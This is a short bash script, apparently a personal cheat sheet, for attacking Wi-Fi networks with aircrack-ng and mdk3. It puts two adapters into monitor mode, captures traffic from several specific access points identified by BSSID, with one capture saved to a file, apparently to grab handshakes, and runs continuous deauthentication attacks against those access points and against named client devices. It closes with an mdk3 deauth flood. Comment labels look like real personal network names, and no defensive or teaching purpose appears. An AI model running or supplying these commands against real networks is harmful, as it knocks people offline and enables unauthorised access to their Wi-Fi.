#!/bin/bash
## start/stop/
sudo airmon-ng start wlp0s26u1u1
sudo airodump-ng wlp0s26u1u1mon
sudo airmon-ng stop wlp0s26u1u1mon

sudo airmon-ng start wlp0s29u1u2
sudo airodump-ng wlp0s29u1u2mon
sudo airmon-ng stop wlp0s29u1u2mon

## dump
sudo airodump-ng  --bssid 04:8D:38:39:89:95 wlp0s26u1u1mon
sudo airodump-ng  --bssid 04:8D:38:39:89:95 wlp0s29u1u2mon

sudo airodump-ng  --bssid 14:CC:20:33:E6:1E wlp0s26u1u1mon

# nguyenngocanh
sudo airmon-ng start wlp0s26u1u1 && sudo airodump-ng  --bssid 04:8D:38:39:89:95 wlp0s26u1u1mon -c 1
sudo aireplay-ng -0 0 -a 04:8D:38:39:89:95 wlp0s26u1u1mon -c 34:23:87:9C:0F:07
sudo aireplay-ng -0 0 -a 04:8D:38:39:89:95 wlp0s26u1u1mon -c EC:51:BC:80:94:69

sudo aireplay-ng -0 0 -a 04:8D:38:39:89:95 wlp0s29u1u2mon -c 34:23:87:9C:0F:07
sudo aireplay-ng -0 0 -a 04:8D:38:39:89:95 wlp0s29u1u2mon -c EC:51:BC:80:94:69
# tplink
sudo airmon-ng start wlp0s26u1u1 && sudo airodump-ng  --bssid 14:CC:20:33:E6:1E wlp0s26u1u1mon -c 1
sudo aireplay-ng -0 0 -a 14:CC:20:33:E6:1E wlp0s26u1u1mon

# vlxd
sudo airodump-ng   wlp0s26u1u1mon  --bssid A4:F4:C2:A0:10:91 -c 7


# anhtuantang2
sudo airodump-ng   wlp0s26u1u1mon  --bssid 4C:EB:BD:53:51:28 -c 1 -w /home/duy/anhtuantang2
sudo aireplay-ng -0 0 -a 4C:EB:BD:53:51:28 wlp0s26u1u1mon


# mdk3 
sudo mdk3 wlp0s26u1u1mon d -c 1 -b blacklist.txt 
